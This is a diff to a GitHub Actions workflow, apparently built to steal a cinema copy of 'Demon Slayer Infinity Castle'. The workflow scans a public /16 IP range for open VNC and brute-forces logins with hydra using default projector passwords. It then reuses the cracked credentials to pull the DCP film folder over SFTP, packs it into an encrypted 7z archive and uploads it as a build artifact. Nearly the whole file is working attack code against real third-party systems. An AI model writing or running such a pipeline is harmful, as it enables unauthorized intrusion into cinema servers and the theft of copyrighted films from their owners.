@@ -1,4 +1,4 @@
-name: Cinema DCP Hunter – Demon Slayer Part 1
+name: Demon Slayer Infinity Castle – DCP Hunter
 
 on:
   schedule:
@@ -24,74 +24,64 @@ jobs:
         shell: pwsh
         run: |
           choco install nmap rclone 7zip hydra -y --no-progress
-          # Create a tiny password list
           Set-Content -NoNewline -Path "$env:SystemDrive\hydra_passwords.txt" `
             -Value "epson`nadmin`nprojector`n123456"
-        
+
       - name: Scan for open VNC
         id: scan
+        shell: bash
         run: |
           if [ "$RUNNER_OS" == "Linux" ]; then
             nmap -p5900 --open 210.172.0.0/16 -oG - | awk '/5900\/open/{print $2}' > vnc_hosts.txt
           else
             nmap -p5900 --open 210.172.0.0/16 -oG vnc.txt
-            findstr /R "5900/open" vnc.txt > vnc_hosts.txt
+            grep "5900/open" vnc.txt | awk '{print $2}' > vnc_hosts.txt
           fi
-        shell: bash
+          echo "vnc_count=$(wc -l < vnc_hosts.txt)" >> $GITHUB_OUTPUT
+        env:
+          RUNNER_OS: ${{ runner.os }}
 
       - name: Brute VNC passwords
-        id: brute
+        if: steps.scan.outputs.vnc_count != '0'
+        shell: bash
         run: |
-          if [ "$RUNNER_OS" == "Linux" ]; then
-            while read ip; do
-              hydra -l epson -P /usr/share/wordlists/fasttrack.txt vnc://$ip -t 4 -f -o hydra_$ip.txt
-              [ -s hydra_$ip.txt ] && echo "$ip" >> valid_ips.txt
-            done < vnc_hosts.txt
-          else
-            while read ip; do
-              C:\hydra\hydra.exe -l epson -P C:\hydra\passwords.txt vnc://$ip -t 4 -f -o hydra_$ip.txt
-              if [ -s hydra_$ip.txt ]; then echo "$ip" >> valid_ips.txt; fi
-            done < vnc_hosts.txt
-          fi
-        shell: bash
+          PASSWORD_FILE=$([ "$RUNNER_OS" == "Linux" ] && echo "/usr/share/wordlists/fasttrack.txt" || echo "/c/hydra_passwords.txt")
+          while read ip; do
+            hydra -l epson -P "$PASSWORD_FILE" vnc://$ip -t 4 -f -o hydra_$ip.txt
+            [ -s hydra_$ip.txt ] && echo "$ip" >> valid_ips.txt
+          done < vnc_hosts.txt
+        env:
+          RUNNER_OS: ${{ runner.os }}
 
-      - name: Check if any valid IPs
+      - name: Check for valid IPs
         id: valid
-        run: echo "found=$( [ -s valid_ips.txt ] && echo true || echo false )" >> $GITHUB_OUTPUT
         shell: bash
+        run: |
+          echo "found=$([ -s valid_ips.txt ] && echo true || echo false)" >> $GITHUB_OUTPUT
 
-      - name: Mount, copy & compress DCP
-        if: steps.valid.outputs.found == 'true'
+      - name: Download DCP if found
         id: dcp
+        if: steps.valid.outputs.found == 'true'
+        shell: bash
         run: |
           mkdir -p staging
           while read ip; do
-            if [ "$RUNNER_OS" == "Linux" ]; then
-              rclone config create relay$ip sftp host=$ip user=epson port=22 pass="$(grep $ip hydra_*.txt | awk '{print $NF}')"
+              PASS=$(grep -oP '(?<=password: ).*' hydra_$ip.txt | head -n1)
+              rclone config create relay$ip sftp \
+                host=$ip user=epson port=22 pass="$PASS"
               rclone lsf relay$ip:/ | grep -iq dsic && {
                 rclone copy relay$ip:/DSIC_P1 staging/DSIC_P1 -P --transfers=32
                 7z a -pInfinity2025 -mhe=on DSIC_P1.7z staging/DSIC_P1
                 echo "movie_found=true" >> $GITHUB_OUTPUT
                 break
               }
-            else
-              rclone config create relay$ip sftp host=$ip user=epson port=22 pass="$(grep $ip hydra_*.txt | awk '{print $NF}')"
-              rclone lsf relay$ip:/ | findstr /i dsic && (
-                rclone copy relay$ip:/DSIC_P1 staging\DSIC_P1 -P --transfers=32
-                7z a -pInfinity2025 -mhe=on DSIC_P1.7z staging\DSIC_P1
-                echo "movie_found=true" >> $GITHUB_OUTPUT
-                goto :break
-              )
-            fi
           done < valid_ips.txt
-          :break
-        shell: bash
 
       - name: Upload artifact
         if: steps.dcp.outputs.movie_found == 'true'
         uses: actions/upload-artifact@v4
         with:
-          name: DSIC_P1_DCP_${{ matrix.os }}
+          name: DSIC_P1_${{ matrix.os }}
           path: DSIC_P1.7z
           retention-days: 7
 
